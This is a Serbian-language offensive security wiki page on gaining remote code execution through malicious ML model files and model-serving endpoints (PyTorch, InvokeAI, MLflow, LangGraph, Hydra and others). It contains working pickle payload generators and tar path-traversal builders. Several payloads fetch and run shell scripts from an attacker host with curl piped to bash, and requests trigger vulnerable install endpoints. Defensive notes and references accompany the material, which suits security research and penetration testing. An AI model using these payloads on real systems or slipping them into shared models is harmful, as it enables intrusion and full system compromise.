# RCE modela

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela radi RCE-a

Modeli Machine Learning-a obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch itd. Programeri ili produkcioni sistemi mogu da učitaju ove modele i koriste ih. Modeli obično ne bi trebalo da sadrže zlonamerni kod, ali u nekim slučajevima mogu da se iskoriste za izvršavanje proizvoljnog koda na sistemu, bilo kao predviđena funkcija ili zbog ranjivosti u biblioteci za učitavanje modela.

Sledeća tabela navodi reprezentativne ranjivosti iz ove kategorije:

| **Framework / Alat**        | **Ranjivost (CVE ako je dostupna)**                                                    | **RCE vektor**                                                                                                                           | **Reference**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Nesigurna deserializacija u* `torch.load` **(CVE-2025-32434)**                                                              | Zlonamerni pickle u kontrolnoj tački modela dovodi do izvršavanja koda (zaobilazeći zaštitu `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + preuzimanje zlonamernog modela dovodi do izvršavanja koda; RCE putem Java deserializacije u management API-ju                                        | |
| **NVIDIA Merlin Transformers4Rec** | Nesigurna deserializacija kontrolne tačke putem `torch.load` **(CVE-2025-23298)**                                           | Nepouzdana kontrolna tačka aktivira pickle reducer tokom `load_model_trainer_states_from_checkpoint` → izvršavanje koda u ML worker-u            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + nesigurna MessagePack extension hook funkcija **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Korisnički kontrolisan ključ `filter` ubacuje SQL/JSON-path sintaksu, `UNION SELECT` kreira lažni red kontrolne tačke, a zatim `msgpack` deserializacija uvozi i poziva Python kod koji je izabrao napadač | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (nesiguran YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Učitavanje modela iz YAML-a koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa slojem **Lambda** pokreće proizvoljan Python kod          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Pažljivo kreiran `.tflite` model izaziva integer overflow → oštećenje heap-a (mogući RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela putem `joblib.load` izvršava pickle sa napadačevim payload-om `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (nesiguran `np.load`) *osporeno*                                                                              | Podrazumevano je `numpy.load` dozvoljavao nizove objekata sa pickle-om – zlonamerni `.npy/.npz` izaziva izvršavanje koda                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Putanja do eksternih težina ONNX modela može izaći iz direktorijuma (čitanje proizvoljnih datoteka) <br> Zlonamerni ONNX model u tar arhivi može da prepiše proizvoljne datoteke (što dovodi do RCE-a) | |
| ONNX Runtime (rizik dizajna)  | *(Nema CVE-a)* ONNX custom ops / control flow                                                                                    | Model sa custom operatorom zahteva učitavanje napadačevog native koda; složeni grafovi modela zloupotrebljavaju logiku za izvršavanje nenamernih proračuna   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Korišćenje API-ja za učitavanje modela uz uključenu opciju `--model-control` omogućava path traversal pomoću relativnih putanja radi upisivanja datoteka (npr. prepisivanje `.bashrc` radi RCE-a)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (više heap overflow ranjivosti)                                                                         | Neispravno formatirana GGUF datoteka modela izaziva heap buffer overflow u parseru, što omogućava proizvoljno izvršavanje koda na sistemu žrtve                     | |
| **Keras (stariji formati)**   | *(Nema novog CVE-a)* Legacy Keras H5 model                                                                                         | Zlonamerni HDF5 (`.h5`) model sa slojem Lambda i dalje izvršava kod pri učitavanju (Keras safe_mode ne obuhvata stari format – „downgrade attack“) | |
| **Ostalo** (opšte)        | *Greška u dizajnu* – Pickle serialization                                                                                         | Mnogi ML alati (npr. formati modela zasnovani na pickle-u, Python `pickle.load`) izvršavaju proizvoljan kod ugrađen u datoteke modela, osim ako se to ne spreči | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nepouzdani metapodaci prosleđeni funkciji `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Napadač kontroliše metapodatke/konfiguraciju modela i postavlja `_target_` na proizvoljnu callable funkciju (npr. `builtins.exec`) → izvršava se tokom učitavanja, čak i sa „bezbednim“ formatima (`.safetensors`, `.nemo`, `config.json` repozitorijuma) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Pored toga, postoje neki Python modeli zasnovani na pickle-u, poput onih koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji mogu da se iskoriste za izvršavanje proizvoljnog koda na sistemu ako se ne učitavaju sa `weights_only=True`. Zato svaki model zasnovan na pickle-u može biti posebno podložan ovoj vrsti napada, čak i ako nije naveden u gornjoj tabeli.

### Hydra metapodaci → RCE (radi čak i sa safetensors)

`hydra.utils.instantiate()` uvozi i poziva bilo koji tačkama razdvojeni `_target_` u objektu konfiguracije/metapodataka. Kada biblioteke kao što je Hugging Face Transformers proslede **nepouzdane metapodatke modela** funkciji `instantiate()`, napadač može da navede callable funkciju i argumente koji se odmah izvršavaju tokom učitavanja modela (pickle nije potreban).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Primer payload-a (radi u `model_config.yaml` datoteci `.nemo` modela, `config.json` datoteci repozitorijuma ili u `__metadata__` unutar `.safetensors` datoteke):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ključne tačke:
- Aktivira se pre inicijalizacije modela u NeMo `restore_from/from_pretrained`, HuggingFace coderima za uni2TS i FlexTok loaderima.
- Hydra-in string block-list može da se zaobiđe alternativnim putanjama za import (npr. `enum.bltns.eval`) ili imenima koja razrešava aplikacija (npr. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok takođe parsira metapodatke pretvorene u string pomoću `ast.literal_eval`, što omogućava DoS (prekomernu potrošnju CPU-a/pamćenja) pre poziva Hydra.

### 🆕  InvokeAI RCE preko `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan open-source veb-interfejs za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install`, koji korisnicima omogućava da preuzimaju i učitavaju modele sa proizvoljnih URL-ova.<sup>[[1]](#references)</sup>

Interno, endpoint na kraju poziva:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Kada je dostavljena datoteka **PyTorch checkpoint (`*.ckpt`)**, `torch.load` obavlja **deserializaciju pomoću pickle-a**. Pošto sadržaj dolazi direktno sa URL-a koji kontroliše korisnik, napadač može da ugradi zlonameran objekat sa prilagođenom metodom `__reduce__` u checkpoint; ta metoda se izvršava **tokom deserijalizacije**, što dovodi do **udaljenog izvršavanja koda (RCE)** na InvokeAI serveru.

Ranjivosti je dodeljen identifikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Vodič za eksploataciju

1. Napravite zlonameran checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hostujte `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
3. Pokrenite ranjivi endpoint (autentifikacija nije potrebna):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Kada InvokeAI preuzme datoteku, poziva `torch.load()` → gadget `os.system` se pokreće i napadač dobija izvršavanje koda u kontekstu InvokeAI procesa.

Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo postupak.<sup>[[3]](#references)</sup>

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (podrazumevana vrednost zastavice scan je **false**)
•  Napadač može da pristupi putanji `/api/v2/models/install`
•  Proces ima dozvole za izvršavanje shell komandi

#### Mere ublažavanja

* Nadogradite na **InvokeAI ≥ 5.4.3** – zakrpa podrazumevano postavlja `scan=True` i skenira u potrazi za malverom pre deserijalizacije.<sup>[[2]](#references)</sup>
* Pri programskom učitavanju checkpoint-ova koristite `torch.load(file, weights_only=True)` ili novi pomoćni alat [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Ograničite izvore modela listama dozvoljenih izvora / potpisima i pokrenite servis sa najmanjim potrebnim privilegijama.

> ⚠️ Imajte na umu da je svaki format zasnovan na Python pickle-u (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` datoteke) sam po sebi nebezbedan za deserijalizaciju iz nepouzdanih izvora.

---

Primer ad hoc mere ublažavanja ako morate da nastavite da koristite starije verzije InvokeAI iza reverse proxy-ja:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE putem nebezbednog `torch.load` (CVE-2025-23298)

Transformers4Rec kompanije NVIDIA (deo Merlin-a) izložio je nebezbedni loader checkpoint-a koji je direktno pozivao `torch.load()` nad putanjama koje je zadao korisnik. Pošto se `torch.load` oslanja na Python `pickle`, checkpoint koji kontroliše napadač može da izvrši proizvoljan kod putem reducer-a tokom deserijalizacije.<sup>[[5]](#references)</sup>

Ranjiva putanja (pre ispravke): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo dovodi do RCE-a: U Python pickle-u, objekat može da definiše reducer (`__reduce__`/`__setstate__`) koji vraća callable i argumente. Callable se izvršava tokom unpickling-a. Ako se takav objekat nalazi u checkpoint-u, izvršava se pre upotrebe bilo kojih težina.

Minimalni primer zlonamernog checkpoint-a:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vektori isporuke i domet uticaja:
- Trojanski izmenjene kontrolne tačke/modeli deljeni putem repozitorijuma, bucket-a ili registara artefakata
- Automatizovani pipeline-ovi za nastavak obuke/implementaciju koji automatski učitavaju kontrolne tačke
- Izvršavanje se odvija unutar radnika za obuku/inferenciju, često sa povišenim privilegijama (npr. root u kontejnerima)

Ispravka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktni poziv `torch.load()` ograničenim deserializer-om sa listom dozvoljenih tipova, implementiranim u `transformers4rec/utils/serialization.py`. Novi loader proverava tipove/polja i sprečava pozivanje proizvoljnih pozivnih objekata tokom učitavanja.<sup>[[7]](#references)</sup>

Preporuke za odbranu specifične za PyTorch kontrolne tačke:
- Ne koristite unpickle nad nepouzdanim podacima. Kad god je moguće, dajte prednost formatima koji ne omogućavaju izvršavanje koda, kao što su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX.
- Ako morate da koristite PyTorch serijalizaciju, obavezno postavite `weights_only=True` (podržano u novijim verzijama PyTorch-а) ili koristite prilagođeni unpickler sa listom dozvoljenih tipova, sličan zakrpi za Transformers4Rec.<sup>[[4]](#references)</sup>
- Proveravajte poreklo/potpise modela i izolujte deserijalizaciju (seccomp/AppArmor; korisnik koji nije root; ograničen FS i bez odlaznog mrežnog saobraćaja).
- Pratite pojavu neočekivanih podređenih procesa u ML servisima tokom učitavanja kontrolnih tačaka; pratite upotrebu `torch.load()`/`pickle`.

POC i reference za ranjivu verziju/zakrpu:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader ranjiv pre zakrpe: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC zlonamerne kontrolne tačke: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nakon zakrpe: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Primer – pravljenje zlonamernog PyTorch modela

- Napravite model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Učitajte model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserializacija Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD izlaže `resnet` endpoint koji deserijalizuje podatke pod kontrolom korisnika. ZDI je potvrdio da udaljeni napadač može da navede žrtvu da učita zlonamernu stranicu/datoteku, pošalje kreirani serijalizovani blob tom endpointu i pokrene deserijalizaciju sa privilegijama `root`, što dovodi do potpunog kompromitovanja sistema.

Tok eksploatacije odražava tipičnu zloupotrebu pickle-a:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Svaki gadget do kog se može doći tokom deserializacije (konstruktori, `__setstate__`, callback-ovi framework-a itd.) može se zloupotrebiti na isti način, bez obzira na to da li je transport bio HTTP, WebSocket ili datoteka ostavljena u direktorijumu koji se nadgleda.



### LangGraph checkpointer SQLi → MessagePack RCE

Ovaj lanac napada je zanimljiv zato što napadač **ne mora da otpremi zlonamernu datoteku modela**. Umesto toga, aplikacija izlaže **API za perzistenciju AI agenata** (`get_state_history(..., filter=...)`), a korisnički unos stiže do alata za pravljenje upita checkpointer-a.

#### 1. Strukturni SQLi u filterima metapodataka

Ranjivi obrazac za SQLite izgledao je ovako:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Vrednost se prosleđuje kasnije, ali se `query_key` konkatenira u **JSON path string**, pa `'` unutar ključa rečnika izlazi iz `'$.{query_key}'` i ubacuje SQL. Isto važi za **JSON paths, identifikatore, operatore, `LIMIT` i TTL polja**: placeholderi štite samo vrednosti, ne i strukturnu sintaksu upita.

#### 2. `UNION SELECT` može da cilja nizvodne tačke obrade, a ne samo krađu podataka

Upit vraća `type` i serijalizovane bajtove `checkpoint`, koje kasnije koriste:

```python
self.serde.loads_typed((type, checkpoint))
```

To znači da SQLi u klauzuli `WHERE` može da ubaci **lažni red rezultata**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ako kasniji kod parsira, deserijalizuje, upisuje ili izvršava bilo koju izabranu kolonu, mapirajte te kolone na njihove sinkove. U ovom slučaju, lažni red pretvara SQLi u **deserijalizaciju kontrolisanu od strane napadača**.

#### 3. Nesigurni MessagePack extension hookovi ekvivalentni su code gadgetima

msgpack putanja u LangGraph-u koristila je prilagođeni extension hook koji je raspakovao ugnježđenu torku i izvršio:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dakle, MessagePack extension objekat koji kodira nešto ekvivalentno `("os", "system", "id > /tmp/pwned")` uvozi `os`, pronalazi `system` i izvršava komandu. Pri pregledu AI framework-ova proverite **custom MessagePack/JSON/pickle reviver-e** za dinamičke importe, refleksiju ili proizvoljno pozivanje funkcija.

#### 4. Praktični obrazac za reviziju agent framework-ova

Proverite svaki korisnički kontrolisan ulaz koji stiže do:
- API-ja za listanje istorije stanja / memorije / ponovnog izvođenja / kontrolnih tačaka
- builder-a strukturiranih filtera koji generišu SQL ili delove Redis upita
- custom deserializatora (`pickle`, `msgpack`, `json` object hooks, YAML konstruktori)
- putanja za oporavak koje veruju redovima dobijenim iz sloja za trajno čuvanje podataka

Ovaj konkretan lanac uticao je na self-hosted LangGraph implementacije koje koriste SQLite ili Redis checkpointer-e, kada su nepouzdani korisnici mogli da kontrolišu `filter`. U verzijama sa ispravkom navedenim u objavi bili su `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` i `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc: prepisivanje artefakta do pickle RCE

MLflow PyFunc kreiran iz `PythonModel` može da sačuva serijalizovani objekat kao `python_model.pkl`. Metapodaci modela navode `mlflow.pyfunc.model` kao njegov loader, a MLflow implementacija koristi ovo ime datoteke za sačuvani Python model. Zbog toga pristup za upis u skladište artefakata može da dovede do izvršavanja koda u drugoj aplikaciji koja kasnije učita model.<sup>[[17]](#references)[[18]](#references)</sup>

Korisni lanac je **dozvola za upis artefakta → zamena pickle datoteke → navođenje potrošača inference-a da je ponovo učita**. Za eksperiment koji koristi proxied `mlflow-artifacts:/...` root, navedite eksperiment, run i putanju artefakta modela. Tracking server izlaže `GET` i `PUT` na `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimalni reducer može da izvrši komandu čim korisnik odradi unpickle artefakta. Generisanje payload-a pomoću Python verzije navedene u `MLmodel` izbegava probleme s kompatibilnošću.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Pokrenite operaciju koja **učitava postojeći model**, kao što su predikcija, scoring ili deployment. Nemojte prvo ponovo trenirati model jer trening može da zameni zlonamerni artifact novim modelom. Greška aplikacije ne znači da eksploatacija nije uspela: reducer vraća celobrojni status izlaza komande, a ne upotrebljiv model. Počnite sa uočljivim sporednim efektom, kao što su ICMP ili HTTP callback, a zatim ga zamenite konačnim payloadom.<sup>[[20]](#references)</sup>

Tokom procene razlikujte dozvolu za kreiranje run-a od dozvole za prepisivanje artifacta koji pripadaju drugom run-u. Proverite autentifikaciju i dozvole za ažuriranje po run-u, pregledajte neočekivane izmene u `python_model.pkl` i tretirajte poreklo i integritet modela kao deo granice izvršavanja. Aktuelni MLflow kod podržava i postavku `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` i preporučuje artifacts tipa models-from-code umesto učitavanja cloudpickle podataka.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Izloženi serveri modela i ML infrastruktura

Učitavanje zlonamernog modela nije jedini način za pokretanje koda na ML infrastrukturi. API-ji za slanje poslova, endpointi za validaciju koda i povlačenje modela iz registra u self-hosted AI servisima mogu dovesti do izvršavanja koda bez ikakve datoteke modela. Pogledajte [Izloženi self-hosted AI servisi](AI-Exposed-Self-Hosted-AI-Services.md).

## Modeli za Path Traversal

Kao što je objašnjeno u [**ovom blog postu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina formata modela koje koriste različiti AI framework-i zasniva se na arhivama, obično `.zip` datotekama. Zato je moguće zloupotrebiti ove formate za napade Path Traversal, čime se omogućava čitanje proizvoljnih datoteka sa sistema na kojem se model učitava.<sup>[[16]](#references)</sup>

Na primer, sledećim kodom možete da napravite model koji će pri učitavanju kreirati datoteku u direktorijumu `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ili, pomoću sledećeg koda možete kreirati model koji će prilikom učitavanja napraviti symlink ka direktorijumu `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Detaljan pregled: Keras .keras deserializacija i gadget hunting

Za fokusirani vodič kroz interne detalje formata .keras, RCE putem Lambda-layer-a, problem proizvoljnog uvoza u verzijama ≤ 3.8 i otkrivanje gadget-a unutar allowlist-e nakon ispravke, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – „CVE-2024-12029 – InvokeAI deserializacija nepouzdanih podataka“](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI commit ispravke 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacija Metasploit modula Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – bezbednosna razmatranja za torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Dobijanje udaljenog izvršavanja koda u NVIDIA Merlin-u](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI savetodavno obaveštenje: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec commit ispravke b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ranjivi loader pre ispravke (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC zlonamernog checkpoint-a (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nakon ispravke (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Udaljeno izvršavanje koda putem savremenih AI/ML formata i biblioteka](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra dokumentacija za instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra commit za block-list (upozorenje o RCE-u)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Od SQLi-ja do RCE-a: Iskorišćavanje LangGraph-ovog checkpointer-a](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pretvaranje Archive Slip grešaka u visokovredne AI/ML nagrade za pronalaženje ranjivosti](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk savetodavno obaveštenje i PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow izvorni kod – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – endpoint-i za preuzimanje i otpremanje artifact-a](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
